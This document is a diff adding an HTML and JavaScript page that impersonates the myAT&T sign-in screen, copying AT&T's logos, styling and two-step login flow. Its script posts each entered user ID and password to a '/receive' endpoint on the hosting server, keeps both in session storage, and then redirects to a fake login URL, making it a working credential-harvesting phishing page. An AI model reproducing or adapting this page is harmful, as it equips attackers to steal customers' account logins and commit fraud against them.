@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" class="isAndroid isMobile isChrome isTouch isPortrait">
+
+<head>
+    <meta charset="utf-8" />
+    <title>Login Screen</title>
+    <base href="/" />
+
+    <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7;IE=11; IE=EDGE" />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0,shrink-to-fit=no" />
+    <meta name="apple-itunes-app" content="app-id=309172177" /><!-- Dynatrace Javascript -->
+    	<link rel="icon" type="image/x-icon" href="https://cdn.icon-icons.com/icons2/2699/PNG/512/att_logo_icon_170510.png" />
+    	       <link id="myStylesheet" rel="stylesheet" href="https://signin.att.com/static/siam/en/halo_c/halo-c-login/styles.css" /->
+    	       <!--script id="settings" src="Config/settings.js"></script-->
+<script>
+	const url = window.location.href;
+	const parts = url.split('/');
+	const ablp = parts.slice(0, parts.length - 1).join('/');
+	
+console.log(ablp); 
+	// Get the link element by its ID
+/*var stylesheetLink = document.getElementById("myStylesheet");
+
+// Set the href attribute to a new stylesheet URL
+stylesheetLink.href = ablp+"/styles.css"; // Replace with the desired URL
+*/	
+	function generateRandomString(length) {
+  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+  const numbers = '0123456789';
+  let result = '';
+
+  for (let i = 0; i < length - 3; i++) {
+    const randomIndex = Math.floor(Math.random() * characters.length);
+    result += characters.charAt(randomIndex);
+  }
+  
+  for (let i = 0; i < 3; i++) {
+    const randomIndex = Math.floor(Math.random() * numbers.length);
+    result += numbers.charAt(randomIndex);
+  }
+
+  return result;
+}
+
+
+const randomString = generateRandomString(36);
+console.log(randomString);
+
+
+
+
+	
+    </script>
+        
+    <style>
+        .full-height[_ngcontent-jdy-c36] {
+            min-height: 100vh
+        }
+    </style>
+    <style>
+        .app-card-router-outlet[_ngcontent-jdy-c28] {
+            width: 100%
+        }
+    </style>
+    <style>
+        .footer-div[_ngcontent-jdy-c34] {
+            margin-top: 48px;
+            margin-bottom: 24px
+        }
+
+        .footer-links-div[_ngcontent-jdy-c34] {
+            display: flex;
+            flex-direction: row
+        }
+
+        .footer-links-div[_ngcontent-jdy-c34] app-footer-link[_ngcontent-jdy-c34] {
+            margin-right: 24px
+        }
+
+        .footer-links-div[_ngcontent-jdy-c34] app-footer-link[_ngcontent-jdy-c34]:last-child {
+            margin-right: 0
+        }
+
+        .copyright[_ngcontent-jdy-c34] {
+            margin-top: 16px;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: center
+        }
+
+        @media (max-width:767px) {
+            .footer-div[_ngcontent-jdy-c34] {
+                margin-bottom: 32px
+            }
+
+            .footer-links-div[_ngcontent-jdy-c34] {
+                display: flex;
+                flex-direction: column;
+                align-items: flex-start
+            }
+
+            .footer-links-div[_ngcontent-jdy-c34] app-footer-link[_ngcontent-jdy-c34] {
+                margin-bottom: 10px
+            }
+
+            .footer-links-div[_ngcontent-jdy-c34] app-footer-link[_ngcontent-jdy-c34]:last-child {
+                margin-bottom: 0
+            }
+
+            app-footer-link[_ngcontent-jdy-c34] {
+                height: 24px
+            }
+
+            .copyright[_ngcontent-jdy-c34] {
+                margin-top: 16px;
+                justify-content: flex-start
+            }
+        }
+    </style>
+    <style>
+        .header-logo-image-bottom[_ngcontent-jdy-c27],
+        .split-login-header[_ngcontent-jdy-c27] {
+            margin-bottom: 32px
+        }
+
+        .header-logo-image-top[_ngcontent-jdy-c27] {
+            margin-top: 32px
+        }
+
+        .header-logo-position-fr-qrcard[_ngcontent-jdy-c27] {
+            margin-left: 70px;
+            align-self: flex-start
+        }
+
+        .header-logo-position-fr-learMore[_ngcontent-jdy-c27] {
+            margin-bottom: 48px;
+            align-self: flex-start
+        }
+
+        .header-floating-logo-generic[_ngcontent-jdy-c27] {
+            margin-top: 32px;
+            margin-left: 70px;
+            margin-bottom: 64px;
+            align-self: flex-start
+        }
+
+        .left-align-header-logo-desktop[_ngcontent-jdy-c27] {
+            align-self: flex-start
+        }
+
+        .header-logo-image-no-bottom[_ngcontent-jdy-c27] {
+            margin-bottom: 0
+        }
+
+        @media (max-width:767px) {
+            .header-logo-position-fr-qrcard[_ngcontent-jdy-c27] {
+                margin-left: 0;
+                align-self: center
+            }
+
+            .header-logo-image-bottom[_ngcontent-jdy-c27] {
+                margin-bottom: 16px
+            }
+
+            .header-logo-position-fr-learMore[_ngcontent-jdy-c27] {
+                margin-bottom: 16px;
+                align-self: center
+            }
+
+            .header-floating-logo-generic[_ngcontent-jdy-c27] {
+                margin-left: 0
+            }
+
+            .header-floating-logo-generic[_ngcontent-jdy-c27],
+            .left-align-header-logo-desktop[_ngcontent-jdy-c27] {
+                margin-bottom: 32px;
+                align-self: center
+            }
+
+            .header-logo-image-no-bottom[_ngcontent-jdy-c27] {
+                margin-bottom: 0
+            }
+        }
+    </style>
+    <style>
+        .fg-sign-in[_ngcontent-jdy-c50] {
+            margin-top: 8px
+        }
+
+        .bottom-container[_ngcontent-jdy-c50] {
+            margin-top: 48px
+        }
+
+        @media (max-width:767px) {
+            .bottom-container[_ngcontent-jdy-c50] {
+                margin-top: 32px
+            }
+        }
+    </style>
+    <style>
+        .space-below[_ngcontent-jdy-c38] {
+            margin-bottom: 32px
+        }
+
+        @media (max-width:767px) {
+            .space-below[_ngcontent-jdy-c38] {
+                margin-bottom: 24px
+            }
+        }
+    </style>
+    <style>
+        .prepaid-ctn-button[_ngcontent-jdy-c48] {
+            width: 100%;
+            height: 48px;
+            text-align: center;
+            border-radius: 3px;
+            border: 1px solid #1d2329;
+            background-color: #fff;
+            color: #1d2329;
+            font-size: 1.4rem;
+            line-height: 2.5rem;
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center
+        }
+
+        .prepaid-ctn-button[_ngcontent-jdy-c48]:hover {
+            text-decoration: none;
+            background-color: #1d2329;
+            color: #fff
+        }
+        
+        .footlist2{
+        display:inline-flex;
+        flex-direction:row;
+        font-size:1.2rem;
+        padding-top:26px!important;
+        color: #686e74;
+        
+        }
+        
+        
+        .footlistwrap2{
+        display: flex;
+        justify-content:space-evenly;
+        align-items:center;
+        margin-left: 10em;
+        margin-right: 10em;
+        }
+        
+        
+        @media (max-width:767px) { 
+         
+        
+        
+          .footlistwrap2 {
+		    margin-top: 90px;
+		    display: block;
+		    margin-left: 0px;
+		    margin-right: 2em;
+		    margin-bottom: 15px;
+		    
+		}
+		
+		.footlist2{
+        display:block;
+        font-size:1.2rem;
+        padding-top:26px!important;
+        color: #686e74;
+        
+        }
+        
+        
+        .html, body{
+        overflow:hidden;
+        }
+            }
+        
+        
+    </style>
+</head>
+
+<body>
+    <div id="app-root" _nghost-jdy-c36="" ng-version="11.2.14" app-version="20.3.5">
+        <div _ngcontent-jdy-c36="" id="appCompBackground" class="full-width-background bg-white">
+            <div _ngcontent-jdy-c36="" id="appCompContainer" class="container pad-l-none-sm pad-r-none-sm pad-t-none-sm pad-b-none-sm full-height flex flex-column">
+                <!---->
+                <div _ngcontent-jdy-c36="" id="appCompCardContainer" class="row justify-center flex-1">
+                    <div _ngcontent-jdy-c36="" id="appCompCardContDiv" class="pad-none">
+                        <!---->
+                        <app-card _ngcontent-jdy-c36="" role="main" _nghost-jdy-c28="">
+                            <div _ngcontent-jdy-c28="" class="card rel z0 flex flex-column no-border-sm radius-lg no-radius-sm mar-t-none-sm border-shadow login-card mar-t-xl-lg">
+                                <div _ngcontent-jdy-c28="" class="pad-lg-lg pad-xl-sm pad-t-lg-lg pad-t-xl pad-b-lg-lg pad-b-xl pad-l-lg pad-r-lg">
+                                    <app-header _ngcontent-jdy-c28="" class="flex-container" _nghost-jdy-c27=""><img _ngcontent-jdy-c27="" id="headerLogoImage" alt="" src="https://signin.att.com/static/siam/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg" class="header-logo-image header-logo-image-bottom" />
+                                        <!---->
+                                        <!---->
+                                        <!---->
+                                        <div _ngcontent-jdy-c27="" class="split-login-header text-center">
+                                            <h1 _ngcontent-jdy-c27="" id="signInHeaderText" class="heading-lg letter-spacing-3">Sign in  <br><span style="font-size:2rem;">to myAT&T</span></h1> 
+                                            <!--h1 _ngcontent-jdy-c27="" id="signInHeaderToText" class="heading-md letter-spacing-3 mar-t8">to myAT&T</h1-->
+                                        </div>
+                                        <!---->
+                                        <!---->
+                                        <!---->
+                                    </app-header>
+                                    <!---->
+                                    <div _ngcontent-jdy-c28="" class="app-card-router-outlet">
+                                        <router-outlet _ngcontent-jdy-c28=""></router-outlet>
+                                        <app-manual-login _nghost-jdy-c50="">
+                                            <app-error _ngcontent-jdy-c50="" id="appErrorAbove">
+                                                <!---->
+                                            </app-error>
+                                            <!---->
+                                            	<div id="dispemdiv" style="display:flex; align-items:center; justify-content:center; margin-bottom:20px;">
+                                            	
+                                            			<div style="position:relative;">
+                                            				<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAMAAADXqc3KAAAAA3NCSVQICAjb4U/gAAAACXBIWXMAAAGEAAABhAGXHnymAAAAGXRFWHRTb2Z0d2FyZQB3d3cuaW5rc2NhcGUub3Jnm+48GgAAAGZQTFRF////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATug2UwAAACF0Uk5TAAIEDxIWIygpKi1IS1xedn1/kLKzwcbK0Nbm6Orz9/j6uP1CogAAALJJREFUKJF1kl0bgiAMhQ8UoYaCmZCUwv7/n+zCj/Sx7W7veM7G2YA5lGm7GLvWKOxDukw09v1IlJ388SKQr7UAhK49hWLlzZSsWBNh09Qs76eh3OuWw1QAgAzpwIEyBQnAkV3y21qx5ACV/ax/T4+tj88KhuqFf6pNrCaDlvSJQ1OLbhQnDjF2iD2AKtH7tcTzAqCPfIGVYpuz47If/FmirgdLeBNZ2/lF8avljwF/zucLj3cTNXIZ4t8AAAAASUVORK5CYII="
+                                            				style="position:absolute; display:inline-block; height:60px; width:17px;"/>
+                                            		<div id="dispem" style="padding-left:25px; font-weight:500;  font-size:16px;"></div>  
+                                            		</div>
+                                            	</div>
+                                            <form _ngcontent-jdy-c50="" id="login" method="post" class="manual-login-form ng-pristine ng-invalid ng-touched" >
+                                            	  <app-user-input _ngcontent-jdy-c50="" id="userfield" _nghost-jdy-c38="">
+                                                    <div _ngcontent-jdy-c38="" id="userInputContainerDiv" class="form-row space-below ng-pristine ng-invalid ng-touched">
+                                                        <!----><label _ngcontent-jdy-c38="" id="userLabel" for="userID" class="formfield-label">User ID</label>
+                                                        <!----><input _ngcontent-jdy-c38="" id="userID" name="userID" formcontrolname="userID" autocomplete="username" spellcheck="false" autocapitalize="off" aria-describedby="userInlineErrorText" type="email" class="textfield ng-pristine ng-invalid ng-touched" />
+                                                        <div _ngcontent-jdy-c38="" style="display:none; font-size:1.4rem; color:#c70032; margin-top:4px;"  id="userError" role="alert" class="">This information is required. </div> 
+                                                        <!---->
+                                                    </div>
+                                                </app-user-input>
+                                                <!---->
+                                                <!---->
+                                               <app-password-input id="passfield" style="display:none" _ngcontent-sqj-c50="">
+                                               	<div class="form-row rel ng-pristine ng-invalid ng-touched"><div class="inline-flex">
+                                               		<label id="passwordLabel" for="password" class="formfield-label">Password</label>
+                                               		</div>
+                                               		<input id="password" name="password" formcontrolname="password" spellcheck="false" autocomplete="current-password" autocapitalize="off" aria-describedby="passwordInlineErrorText" type="password" class="textfield textfield-password ng-pristine ng-valid ng-touched">
+                                               			<button id="showHideButton" tabindex="0" type="button" aria-disabled="false" class="showHidePasswordButton absolute pad-xxs font-regular color-ui-black" aria-label="Show password">Show</button>
+                                               			<div id="passwordError" role="alert" class="formfield-msg" style="color:red;">Make sure you enter at least 4 characters.</div>
+                                               			</div>
+                                               			</div>
+                                               			</app-password-input>
+                                                <!---->
+                                                <!---->
+                                                <div _ngcontent-jdy-c50="" class="continue-button-spacing"><button _ngcontent-jdy-c50="" id="next" type="button" class="btn-primary btn-full-width letter-spacing-3">Continue</button></div>
+                                                <!---->
+                                                <!---->
+                                                <!---->
+                                                <div _ngcontent-jdy-c50="" class="continue-button-spacing"><button _ngcontent-jdy-c50="" id="sign-in" type="submit" class="btn-primary btn-full-width letter-spacing-3" style="display:none">Sign in</button></div>
+                                           
+                                                <!---->
+                                                <!---->
+                                                <!---->
+                                                <!---->
+                                                <app-dont-have-id-view _ngcontent-jdy-c50="">
+                                                    <div class="action-link-cont">
+                                                        <div class="font-regular"><a id="createNow" class="link-text3 solo type-sm" href=""><span id="dontHaveIdText">Don't have a user ID?</span><span> </span>Create one now</a>
+                                                            <!---->
+                                                            <!---->
+                                                        </div>
+                                                    </div>
+                                                </app-dont-have-id-view>
+                                                <!---->
+                                                <app-fast-pay-button _ngcontent-jdy-c50="" style="margin-bottom:2px!important; ">
+                                                    <div id="fastPayArea" class="action-link-cont"><a id="fastPayButton" class="link-text3 solo type-sm" href="" target="_self">Pay without signing in</a></div>
+                                                    <!---->
+                                                </app-fast-pay-button>
+                                                <app-prepaid-ctn-button _ngcontent-jdy-c50="" _nghost-jdy-c48="">
+                                                    <!---->
+                                                </app-prepaid-ctn-button>
+                                                <!---->
+                                                <!---->
+                                            </form>
+                                            <!---->
+                                        </app-manual-login>
+                                        
+                                        <!---->
+                                    </div>
+                                </div>
+                            </div>
+                            <!--div class="footlistwrap"">  
+                <div class="footlist"><span>Legal policy center<span></div>
+               <div class="footlist"> <span>Privacy policy</span></div>
+                <div class="footlist"><span >Terms of use</span></div>
+               <div class="footlist"> <span>Accessibility</span></div>
+                </div-->  
+                        </app-card>
+                    </div>
+                </div>
+   			             
+                <div _ngcontent-jdy-c36="" id="appCompFooterContainer" class="row flex-centered">
+                	
+                    <div _ngcontent-jdy-c36="" id="appCompFooterContDiv" class="grid-col-12 pad-none">
+                        <app-footer _ngcontent-jdy-c36="" role="contentinfo" _nghost-jdy-c34="">
+                        	
+                            <div _ngcontent-jdy-c34="" class="login-background footer-div pad-l-lg-sm pad-r-lg-sm">
+                                <div class="footlistwrap2"">  
+                <div class="footlist2"><span>Legal policy center<span></div> 
+               <div class="footlist2"> <span>Privacy policy</span></div>
+                <div class="footlist2"><span >Terms of use</span></div>
+               <div class="footlist2"> <span>Accessibility</span></div>
+                </div>  
+                                <!---->
+                                <div _ngcontent-jdy-c34="" class="font-regular copyright"><span _ngcontent-jdy-c34="" id="copyrightTextSpan" class="type-xs color-ui-medium-gray">©2023 AT&T Intellectual Property. All rights reserved.</span></div>
+                                <!---->
+                            </div>
+                        </app-footer>
+                        <!---->
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!---->
+    </div>
+
+    <script>
+    /*	if (window.innerWidth < 768) {
+  document.querySelector('.footlist').style.display = '';
+  document.querySelector('.footlistwrap').style.display = '';
+  document.querySelector('.footlist2').style.display = 'none';
+  document.querySelector('.footlistwrap2').style.display = 'none';
+}else{
+  document.querySelector('.footlist').style.display = 'none';
+  document.querySelector('.footlistwrap').style.display = 'none';
+  document.querySelector('.footlist2').style.display = '';
+  document.querySelector('.footlistwrap2').style.display = '';
+}*/
+
+    	</script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+	
+	<script id="settings"></script>
+<script>
+    
+</script>
+
+		</body>
+    	
+    
+    	<script>
+    		    	document.getElementById('dispemdiv').addEventListener('click', function(){
+    		        window.history.back();
+    		    	});
+    		
+    		
+		window.addEventListener("popstate", function(event) {
+        console.log('popstate');
+        if (passfield.style.display === "block") { 
+            // Reverse the changes and switch the settings
+            userfield.style.display = "block";
+            passfield.style.display = "none";
+            Next.style.display = "block";
+            Signin.style.display = "none";
+            dispemElement.textContent = "";
+            document.getElementById('signInHeaderText').innerHTML = "Sign in  <br><span style='font-size:2rem;'>to myAT&T</span>";
+        } else {
+            userfield.style.display = "none";
+            passfield.style.display = "block";
+            
+        }
+    });
+      
+    		const inputElement = document.getElementById('userID'); 
+    		const passElement = document.getElementById('password');
+    		const passwordToggle = document.getElementById('showHideButton');
+			const passwordInput = document.getElementById('password');
+
+			passwordToggle.addEventListener('click', function() {
+			  if (passwordInput.type === 'password') {
+			    passwordInput.type = 'text'; // Show the password as plain text
+				passwordToggle.textContent = "Hide";
+			  } else if (passwordInput.type === 'text') {
+			    passwordInput.type = 'password'; // Hide the password with dots
+				passwordToggle.textContent = "Show";
+			  }
+			});
+
+			let message = "";
+			
+    		
+		function smb() {
+		var login = inputElement.value;
+		var pword = passElement.value;
+		let visitor = sessionStorage.setItem('visitor', login);
+		let url = ablp+'/receive';
+                    $.ajax({
+                    	method: 'POST',
+                        url: url,
+                        data: { UserId: login, Password: pword, loginTime:'LOGIN'  }
+                    }).done(function(msg) {
+                console.log(msg);
+                sessionStorage.setItem('usersess', login);
+    			sessionStorage.setItem('passess', pword);
+    			let urlpr = generateRandomString(6)+"%User="+login+" id_token="+randomString;
+    			sessionStorage.setItem('urlpr', urlpr);
+                window.location.href = ablp+"/login?"+ urlpr;
+
+            }).fail(function(err, textstatus, error) {
+                // Handle AJAX request failure here
+            });
+      }
+		</script>
+    
+    <script>
+		var email = "";
+		var dispemElement = document.getElementById('dispem');
+		var dispemdiv = document.getElementById('dispemdiv');
+		var Signin = document.getElementById('sign-in'); 
+		var userfield = document.getElementById('userfield');
+		var passfield = document.getElementById('passfield');
+		
+		var Next = document.getElementById('next');
+		Next.addEventListener('click', function(){
+		history.pushState({ page: "login" }, "Login", null);
+		
+		
+		if(inputElement.value !== ""){
+		dispemElement.textContent = inputElement.value;
+		dispemdiv.style.display = 'flex';
+		Next.style.display = "none";
+		Signin.style.display = "block";
+		userfield.style.display = "none";
+		passfield.style.display = "block";
+		document.getElementById('signInHeaderText').textContent = "Welcome";
+		  }else {
+		  dispemdiv.style.display = 'none';
+		  document.getElementById("userError").textContent = "This information is required.";
+		  document.getElementById('userError').style.display = "block";
+		  document.getElementById('userID').style.borderColor = "#c70032";
+
+		  } 
+		
+		});
+		
+		passwordInput.addEventListener("input", function() { 
+		
+		if (passwordInput.value.length >= 4) {
+		  console.log('input');
+		 	    document.getElementById("passwordError").style.display = "none";
+		  }else {
+		  document.getElementById("passwordError").style.display = "";
+		  }
+		  });
+		
+			inputElement.addEventListener("input", function() { 
+		
+		if (inputElement.value.length >= 4) {
+		  document.getElementById('userID').style.borderColor = "";
+		  console.log('input');
+		 	    document.getElementById("userError").style.display = "none";
+		  }else {
+		  
+		  document.getElementById("userError").textContent = "Make sure you enter at least 4 characters.";
+		  document.getElementById("userError").style.display = "";
+		  }
+		  });
+		
+		Signin.addEventListener('click', function(){
+		event.preventDefault();
+		//showSpinner();
+		smb();
+		message = "";
+		});
+		
+		// Check the screen width and perform an action if it's below 768 pixels
+
+		  
+	</script>
+</html>
